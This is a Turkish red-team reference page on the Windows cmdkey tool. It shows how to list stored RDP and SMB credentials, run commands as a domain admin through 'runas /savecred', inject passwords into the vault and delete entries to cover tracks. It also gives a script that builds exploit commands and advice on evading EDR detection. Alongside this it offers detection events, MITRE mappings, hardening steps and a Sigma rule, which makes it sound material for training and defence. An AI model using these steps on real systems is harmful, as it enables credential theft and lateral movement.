# cmdkey

> **Kategori:** [2. WINDOWS YEREL KOMUT SATIRI VE LOLBINS (NATIVE WINDOWS & SYSINTERNALS)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows Kimlik Yöneticisi CLI aracı; kasada saklanan kayıtlı RDP, SMB ve ağ kimlik bilgilerini listeleme (`/list`), yeni kimlik ekleme (`/generic`, `/add`) ve silme (`/delete`).

---

## 1. Genel Bakış ve Amaç

`cmdkey.exe`, Windows Server 2003 ve Windows Vista'dan itibaren tüm Windows sürümlerinde varsayılan olarak (`C:\Windows\System32\cmdkey.exe`) bulunan, **Windows Kimlik Yöneticisi (Credential Manager / CredMan)** kasasını komut satırından yönetmeye yarayan yerel bir LOLBin aracıdır.

Kullanıcılar veya sistem yöneticileri Uzak Masaüstü (RDP) bağlantısı yaparken *"Beni Hatırla / Kimlik bilgilerimi kaydet"* seçeneğini işaretlediklerinde veya ağ paylaşımlarına (SMB), Git reposuna veya VPN tünellerine bağlandıklarında, bu kimlik bilgileri Windows DPAPI (Data Protection API) ile şifrelenerek kullanıcının profil dizininde saklanır.

Red Team operasyonlarında `cmdkey`, saldırganın sisteme sızdığında bellekteki veya kasadaki kayıtlı kimlik bilgilerini açığa çıkarması (**Credential Access**), parolayı bilmese dahi kayıtlı kimliklerle uzak sunuculara (**TERMSRV / RDP**) parolasız yetkili oturum açması (**Lateral Movement / SaveCred Abuse**) ve izlerini temizlemesi için kritik bir araçtır.

### Protokol ve Çalışma Prensibi

`cmdkey`, yerel işletim sistemi belleğinde çalışan `advapi32.dll` içerisindeki Credential Manager API'leri (`CredEnumerate`, `CredWrite`, `CredDelete`) ile etkileşime girer:

```
┌──────────────────────────────────────────────────────────────┐
│                    Kullanıcı Komut Kabuğu                    │
│                      [ cmdkey.exe ]                          │
└──────────────────────────────┬───────────────────────────────┘
                               │
               1. advapi32!CredEnumerateW(...)                 
               2. DPAPI Şifre Çözme / Kasa Okuma               
                               │
                               ▼
┌──────────────────────────────────────────────────────────────┐
│            Windows Kimlik Yöneticisi (CredMan)               │
│   Dosya Yolu: %APPDATA%\Microsoft\Credentials\<GUID>         │
│                                                              │
│  - Hedef: TERMSRV/DC01.lab.local (RDP Kaydı)                 │
│  - Kullanıcı: LAB\da_admin                                   │
│  - Kimlik Türü: Domain Password / Generic                    │
│  - Parola: [DPAPI ile Şifrelenmiş Blob]                      │
└──────────────────────────────┬───────────────────────────────┘
                               │
         (A) İstismar: Parolasız Yanal Hareket
         runas /savecred /user:LAB\da_admin cmd.exe
         veya mstsc /v:DC01.lab.local
                               ▼
┌──────────────────────────────────────────────────────────────┐
│                 Uzak Hedef (Örn: DC01)                       │
│    Windows, şifreli parolayı DPAPI ile çözüp ağ              │
│    isteğine otomatik olarak enjekte eder!                    │
└──────────────────────────────────────────────────────────────┘
```

1. **Parola Maskeleme ve Otomatik Kimlik Doğrulama:** `cmdkey /list` komutu kasadaki hedef sunucuyu (`Target`) ve kullanıcı adını (`User`) açık metin olarak gösterir ancak parolayı güvenlik sebebiyle konsola basmaz. Ancak Windows işletim sistemi mimarisi gereği, bu kayıt kasada bulunduğu sürece `mstsc.exe` veya `runas /savecred`, kullanıcının parolasını sormadan kasadaki şifreli parolayı çözer ve ağ kimlik doğrulamasına doğrudan enjekte eder.
2. **Kasa Depolama Türleri:**
   - **Domain Password / Generic:** Windows kimlik doğrulama paketleri (NTLM/Kerberos) tarafından uzak sunucular için saklanan kayıtlar.
   - **Windows Credentials:** Doğrudan Windows oturumuna bağlı kimlikler.
3. **DPAPI ile Koruma:** Kasa dosyaları diske `%APPDATA%\Microsoft\Credentials` altında yazılır. `cmdkey` bellekte çalıştığı için DPAPI anahtarlarını kırmaya gerek kalmadan oturumun yetkisiyle kasayı anında okur.

### Neden Önemli?

| Kullanım Senaryosu | Açıklama |
|---|---|
| **Kayıtlı RDP ve SMB Kimliklerini Keşfetme** | Yöneticilerin unuttuğu veya kaydettiği kritik hesapları (`TERMSRV/DC01`) tek komutla açığa çıkarma. |
| **Parolasız Yanal Hareket (SaveCred Abuse)** | Parolayı hiç görmeden ve kırmadan `runas /savecred` ile doğrudan hedef sunucuda etki alanı yöneticisi oturumu açma. |
| **Özel Kimlik Enjeksiyonu** | Ele geçirilen bir NTLM hash'i veya parolayı kasaya ekleyerek (`/generic`) arka planda çalışan süreçlerin bu kimliği kullanmasını sağlama. |
| **Adli İz Temizliği (Anti-Forensics)** | Operasyon sırasında eklenen test veya kalıcılık kimliklerini kasadan temizleme (`/delete`). |

### Alternatif Araçlarla Karşılaştırma

| Kriter / Yetenek | `cmdkey.exe` | `Mimikatz (dpapi::cred)` | `SharpDPAPI` | `VaultCmd.exe` |
|---|---|---|---|---|
| **Varsayılan Bulunabilirlik** | Tüm Windows sürümlerinde hazır | Harici araç indirilmelidir | Harici .NET derlemesi | Windows 7+ yerleşik |
| **Açık Parolayı Gösterme** | Göstermez (Yalnızca hedef ve kullanıcı) | Gösterir (DPAPI ile çözer) | Gösterir (DPAPI ile çözer) | Yalnızca Web/Vault kimlikleri |
| **Parolasız Kullanım (SaveCred)** | Doğrudan tetikler (`runas`) | Bilet/Hash gerektirir | Bilet/Hash gerektirir | Yok |
| **Yetki Gereksinimi** | Düşük Yetkili Kullanıcı (Kendi kasası) | Local Admin / SYSTEM | Local Admin / MasterKey | Düşük Yetkili Kullanıcı |
| **EDR Algısı** | Düşük (Meşru Windows LOLBin) | Çok Yüksek (İmzalı zararlı) | Yüksek (.NET Assembly) | Düşük |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

### Genel Sözdizimi

```cmd
cmdkey /list [hedef]
cmdkey /generic:<hedef> /user:<kullanıcı> /pass:<parola>
cmdkey /add:<hedef> /user:<kullanıcı> /pass:<parola>
cmdkey /delete:<hedef>
```

### Kritik Parametreler ve Açıklamaları

| Parametre | Açıklama | Örnek Kullanım |
|---|---|---|
| `/list` | Kullanıcının kasasında saklanan tüm kayıtlı kimlik bilgilerini döker. | `cmdkey /list` |
| `/list:<hedef>` | Yalnızca belirtilen hedefe ait kimlik kaydını sorgular. | `cmdkey /list:TERMSRV/DC01.lab.local` |
| `/generic:<hedef>` | Genel (Generic) bir kimlik bilgisi girdisi oluşturur (RDP ve web uygulamaları için). | `cmdkey /generic:TERMSRV/10.10.10.1 /user:admin /pass:P@ss` |
| `/add:<hedef>` | Bir etki alanı veya sunucu için kimlik bilgisi ekler. | `cmdkey /add:DC01 /user:LAB\admin /pass:Secret123!` |
| `/user:<kullanıcı>` | Eklenecek kimlik bilgisinin kullanıcı adını (`DOMAIN\User` veya `User`) belirtir. | `/user:LAB\administrator` |
| `/pass:<parola>` | Eklenecek kimlik bilgisinin parolasını açık metin olarak belirler. | `/pass:P@ssw0rd2026!` |
| `/smartcard` | Akıllı kart (Smart Card) kimlik bilgisi ekler. | `cmdkey /add:DC01 /smartcard` |
| `/delete:<hedef>` | Belirtilen hedefe ait kayıtlı kimlik bilgisini kasadan siler. | `cmdkey /delete:TERMSRV/10.10.10.1` |

### Modül ve Yetenek Ağacı

```
cmdkey.exe Yetenek Ağacı
├── 1. Kimlik Bilgisi Keşfi
│   ├── cmdkey /list                 (Tüm kayıtlı RDP/Ağ kimlikleri)
│   └── cmdkey /list:<hedef>         (Hedefe özel kayıt sorgusu)
├── 2. Kimlik Bilgisi İstismarı (SaveCred)
│   ├── runas /savecred              (Kayıtlı kimlikle komut çalıştırma)
│   └── mstsc /v:<hedef>             (Kayıtlı kimlikle RDP oturumu)
├── 3. Kimlik Enjeksiyonu ve Manipülasyonu
│   ├── cmdkey /generic:<hedef>      (RDP/Generic kimlik ekleme)
│   └── cmdkey /add:<hedef>          (Domain kimlik kaydı)
└── 4. Kasa Temizliği (Anti-Forensics)
    └── cmdkey /delete:<hedef>       (Kasadan hedef kaydını silme)
```

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Kayıtlı Kimlik Bilgilerini Listeleme ve RDP Hedeflerini Keşfetme

Bir iş istasyonu ele geçirildiğinde operatörün ilk baktığı yerlerden biri Credential Manager kasasıdır:

```cmd
cmdkey /list
```

**Örnek Çıktı Analizi:**
```text
Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02yhn...

    Target: Domain:target=DC01.lab.local
    Type: Domain Password
    User: LAB\da_admin

    Target: TERMSRV/192.168.1.10
    Type: Generic
    User: LAB\Administrator
```
- `Target: Domain:target=DC01.lab.local`: Etki alanı denetleyicisi için `LAB\da_admin` (Domain Admin) kimliği saklanmış!
- `Target: TERMSRV/192.168.1.10`: `192.168.1.10` IP adresindeki sunucuya bağlanmak için `LAB\Administrator` hesabı kaydedilmiş.
- Bu çıktı, saldırganın hedef sunucularda tam yönetici yetkisine sahip olduğunu ancak parolayı henüz bilmediğini kanıtlar.

---

### Senaryo 2: Parolayı Bilmeden Kayıtlı Kimlikle Yanal Hareket (SaveCred Abuse)

Kasadaki `LAB\da_admin` kimliğini kullanarak hedef DC üzerinde komut çalıştırmak:

```cmd
runas /savecred /user:LAB\da_admin "cmd.exe /k whoami /all"
```

**İstismar Süreci:**
1. `runas` komutu çalıştırıldığında `/savecred` bayrağı sayesinde kullanıcıya parola sorulmaz.
2. Windows, `cmdkey` kasasındaki şifreli parolayı DPAPI ile arka planda çözer.
3. Yeni açılan komut istemcisi doğrudan `LAB\da_admin` etki alanı yöneticisi belirteciyle başlar!
4. Buradan doğrudan DC'nin `C$` sürücüsü incelenebilir veya DCSync saldırısı başlatılabilir.

Eğer kayıtlı hedef bir Uzak Masaüstü ise (`TERMSRV/192.168.1.10`):
```cmd
mstsc /v:192.168.1.10
```
RDP istemcisi açıldığında parola sormadan doğrudan masaüstü oturumu bağlanır.

---

### Senaryo 3: Sahte veya Ele Geçirilmiş Kimlik Bilgisini Kasaya Enjekte Etme

Saldırgan ele geçirdiği bir servis parolasını kasaya ekleyerek arka planda çalışan süreçlerin veya script'lerin bu kimlikle çalışmasını sağlayabilir:

```cmd
cmdkey /generic:TERMSRV/DC01.lab.local /user:LAB\da_admin /pass:P@ssw0rd2026!
```

**Örnek Çıktı:**
```text
CMDKEY: Credential added successfully.
```

---

### Senaryo 4: Ağ Paylaşımı İçin Etki Alanı Kimliği Kaydetme

Sürekli kimlik bilgisi sormasını engellemek ve SMB bağlantılarını otomatikleştirmek için:

```cmd
cmdkey /add:FS01.lab.local /user:LAB\backup_user /pass:BackupPassword123!
```

Artık `net use \\FS01.lab.local\Yedekler` komutu parola sorulmadan bağlanır.

---

### Senaryo 5: Hedef Kaydını Kasadan Silme (İz Temizliği)

Operasyon tamamlandığında eklenen kimlik bilgisini silmek:

```cmd
cmdkey /delete:TERMSRV/DC01.lab.local
```

**Örnek Çıktı:**
```text
CMDKEY: Credential deleted successfully.
```

---

### Senaryo 6: PowerShell ile cmdkey Çıktısını Parse Eden Otomasyon Betiği

Kasadaki tüm hedefleri ve kullanıcıları ayrıştırıp doğrudan `runas` komut dizgilerini oluşturan PowerShell script'i:

```powershell
# cmdkey /list çıktısını parse edip runas komutlarını üreten betik:
$cmdkeyOutput = cmdkey /list | Out-String
$entries = $cmdkeyOutput -split 'Target:\s+' | Where-Object { $_ -match 'User:\s+' }

$Results = foreach ($entry in $entries) {
    $target = ($entry -split '\r?\n')[0].Trim()
    $user = if ($entry -match 'User:\s+([^\r\n]+)') { $matches[1].Trim() } else { "N/A" }
    $type = if ($entry -match 'Type:\s+([^\r\n]+)') { $matches[1].Trim() } else { "N/A" }

    [PSCustomObject]@{
        Target       = $target
        User         = $user
        Type         = $type
        ExploitCmd   = if ($user -ne "N/A" -and $target -notmatch 'virtualapp') { "runas /savecred /user:$user cmd.exe" } else { "N/A" }
    }
}
$Results | Format-Table -AutoSize
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı | Olası Neden | Çözüm Adımı |
|---|---|---|
| `The system cannot find the file specified.` | Kasada belirtilen ada sahip bir kimlik kaydı yoktur veya kasa tamamen boştur. | `cmdkey /list` ile mevcut kayıtları doğrulayın; hedef adını birebir aynı formatta (`TERMSRV/IP`) yazın. |
| `Access is denied.` | Başka bir kullanıcının veya `SYSTEM` oturumunun kasasına müdahale edilmeye çalışılmaktadır. | Credential Manager kullanıcı profili bazlıdır; komutu hedef kullanıcının kendi etkileşimli oturumu içinde çalıştırın. |
| `runas error: 1326: The user name or password is incorrect.` | Kasadaki parola değiştirilmiş veya süresi dolmuştur; kaydedilen parola geçersizdir. | Parolanın güncelliğini doğrulayın veya kasadaki eski kaydı `cmdkey /delete` ile temizleyin. |
| `runas error: 740: The requested operation requires elevation.` | Çalıştırılmak istenen uygulama (örneğin regedit) yönetici ayrıcalığı gerektirmektedir. | UAC Bypass uygulayın veya komut kabuğunu High Integrity seviyesinde açın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Artifacts & Logs)

- **Windows Güvenlik Olay Günlükleri:**
  - **Event ID 4688 / Sysmon Event ID 1 (Process Creation):** `cmdkey.exe /list` veya `cmdkey.exe /delete` komut satırı argümanları kaydedilir.
  - **Event ID 4624 (Successful Logon - Type 9 / NewCredentials):** `runas /savecred /netonly` kullanıldığında hedef sistemde veya yerelde Logon Type 9 oluşur.
  - **Event ID 5379 (Credential Manager Reading):** Gelişmiş güvenlik denetimi açıksa, bir sürecin Credential Manager kasasını okuma girişimleri bu olay kimliğiyle kaydedilir.
- **Disk İzleri:**
  - Kasaya her yeni kayıt eklendiğinde `%APPDATA%\Microsoft\Credentials\` dizininde yeni bir GUID isimli şifreli dosya oluşturulur (Sysmon Event ID 11 - File Create).

### 5.2 Ağ ve EDR İmzaları

- **LOLBin Tespiti:** `cmdkey.exe` Microsoft imzalı güvenilir bir sistem bileşenidir. Ancak bir saldırı anında (örneğin PowerShell, web shell veya macro altından) `cmdkey /list` çalıştırılması, EDR sistemleri tarafından **Credential Access (T1555.004)** olarak doğrudan işaretlenir.
- **SaveCred Tetiklemesi:** `runas /savecred` komutu, uç nokta savunma kurallarında yüksek riskli bir anomali olarak kabul edilir; kurumsal ortamlarda sıradan personelin bu bayrağı kullanması beklenmez.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1555.004** | Credentials from Password Stores: Windows Credential Manager | Kasada saklanan RDP ve etki alanı kimliklerini keşfetme (`cmdkey /list`). |
| **T1078.002** | Valid Accounts: Domain Accounts | Kayıtlı etki alanı kimliklerini kullanarak yanal hareket yapma (`runas /savecred`). |
| **T1021.001** | Remote Services: Remote Desktop Protocol | Kasadaki `TERMSRV` kayıtlarıyla parolasız RDP oturumu açma (`mstsc`). |
| **T1070** | Indicator Removal on Host | Kullanılan kimlik kayıtlarını silerek izleri temizleme (`cmdkey /delete`). |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Alternatif Teknik |
|---|---|
| **`cmdkey /list` Komut Satırı Tespiti** | `cmdkey.exe` sürecini başlatmak yerine, bellek içi PowerShell veya C# kodu ile `advapi32!CredEnumerateW` API'sini doğrudan çağırın; böylece EID 4688 süreç izi oluşmaz. |
| **`runas /savecred` Alarmı** | `runas` yerine, kaydedilen kimlikleri doğrudan hedef SMB veya RPC isteklerinde arka planda kullanan Win32 API çağrılarını tercih edin. |
| **Kalıcı Kasa Dosyaları** | Kasaya kimlik eklemekten kaçının; diske yazılan `%APPDATA%\Microsoft\Credentials` dosyaları adli bilişim incelemelerinde kolayca yakalanır. |

### 5.5 Savunma Karşılığı (Blue Team)

- **Ağ Kimlik Kaydını Engelleme (GPO):**
  Grup İlkesi üzerinden kullanıcıların ağ kimliklerini kaydetmesini yasaklayın:
  `Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options -> Network access: Do not allow storage of passwords and credentials for network authentication` = **Enabled**.
- **Restricted Admin Mode (RDP Sertleştirme):**
  RDP bağlantılarında kimlik bilgilerinin uzak makinede önbelleğe alınmasını ve kasaya yazılmasını engellemek için Restricted Admin modunu aktif edin.
- **Sigma Kuralı Mantığı:**
  ```yaml
  title: Credential Manager Enumeration via Cmdkey
  status: high
  logsource:
      category: process_creation
      product: windows
  detection:
      selection:
          Image|endswith: '\cmdkey.exe'
          CommandLine|contains:
              - '/list'
              - '/delete'
      condition: selection
  ```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

### 6.1 Kayıtlı Tüm Kimlik Bilgilerini Listeleme
```cmd
cmdkey /list
```
- **Ne Yapar?** Kullanıcının kasasında saklanan tüm RDP (`TERMSRV`), SMB ve genel ağ kimlik kayıtlarını ekrana basar.
- **Ne Zaman Kullanılır?** İlk erişim sağlanan sistemde unutulmuş veya kaydedilmiş yönetici hesaplarını keşfetmek için.
- **Parametreler:** `/list`.

### 6.2 Belirli Bir Hedefe Yönelik Kimliği Sorgulama
```cmd
cmdkey /list:TERMSRV/DC01.lab.local
```
- **Ne Yapar?** Yalnızca belirtilen sunucuya ait kimlik kaydını filtreler.
- **Ne Zaman Kullanılır?** Hedef etki alanı denetleyicisi için kayıtlı bir oturumun olup olmadığını teyit etmek için.
- **Parametreler:** `/list:<hedef>`.

### 6.3 Kayıtlı Kimlikle Parolasız Ağ Oturumu Başlatma (SaveCred)
```cmd
runas /savecred /user:LAB\da_admin "cmd.exe"
```
- **Ne Yapar?** Kasadaki `LAB\da_admin` kimliğini kullanarak parolayı sormadan yetkili bir komut istemcisi açar.
- **Ne Zaman Kullanılır?** `cmdkey /list` çıktısında kritik bir etki alanı yöneticisi hesabı görüldüğünde yanal hareket için.
- **Parametreler:** `/savecred` (Kasadaki parolayı kullanır), `/user:<Kullanıcı>` (Hedef hesap).

### 6.4 RDP İçin Yeni Bir Kimlik Bilgisi Kaydetme
```cmd
cmdkey /generic:TERMSRV/192.168.1.10 /user:Administrator /pass:P@ssw0rd2026!
```
- **Ne Yapar?** Hedef sunucu için geçerli bir RDP kimlik bilgisini Windows kasasına kaydeder.
- **Ne Zaman Kullanılır?** Ele geçirilen bir kimlik bilgisiyle `mstsc /v:192.168.1.10` üzerinden doğrudan parolasız bağlanmak için.
- **Parametreler:** `/generic:<Hedef>`, `/user:<Kullanıcı>`, `/pass:<Parola>`.

### 6.5 Ağ Paylaşımı (SMB) İçin Etki Alanı Kimliği Ekleme
```cmd
cmdkey /add:FS01.lab.local /user:LAB\backup_admin /pass:SecretPass123!
```
- **Ne Yapar?** Dosya sunucusuna yapılacak bağlantılar için kalıcı kimlik doğrulaması tanımlar.
- **Ne Zaman Kullanılır?** Arka planda çalıştırılacak script'lerin SMB paylaşımlarına parola hatası almadan erişmesi için.
- **Parametreler:** `/add:<Hedef>`, `/user:<Kullanıcı>`, `/pass:<Parola>`.

### 6.6 Kayıtlı Hedef Kimliğini Kasadan Silme
```cmd
cmdkey /delete:TERMSRV/192.168.1.10
```
- **Ne Yapar?** Belirtilen hedefe ait kimlik kaydını kasadan tamamen kaldırır.
- **Ne Zaman Kullanılır?** Operasyon tamamlandığında veya sahte kimlik enjeksiyonundan sonra geride iz bırakmamak için.
- **Parametreler:** `/delete:<Hedef>`.

### 6.7 Kayıtlı RDP Oturumunu Doğrudan Başlatma
```cmd
mstsc /v:DC01.lab.local
```
- **Ne Yapar?** Eğer kasada `TERMSRV/DC01.lab.local` kaydı varsa, kimlik bilgilerini girmeden otomatik oturum açar.
- **Ne Zaman Kullanılır?** GUI tabanlı grafik arayüz erişimiyle hedef sunucuyu yönetmek için.
- **Parametreler:** `/v:<Hedef>` (Bağlanılacak sunucu).

---

## Kaynaklar

| Kaynak | Bağlantı |
|---|---|
| Microsoft Learn — cmdkey command reference | [learn.microsoft.com](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) |
| MITRE ATT&CK T1555.004 (Windows Credential Manager) | [attack.mitre.org](https://attack.mitre.org/techniques/T1555/004/) |
| LOLBAS Project — cmdkey.exe | [lolbas-project.github.io](https://lolbas-project.github.io/) |
| HackTricks — Windows Credentials & Vaults | [book.hacktricks.wiki](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/#credentials-manager--vault) |

---

> **Önceki:** [← whoami](./whoami.md) · **Sonraki:** [gpresult →](./gpresult.md)
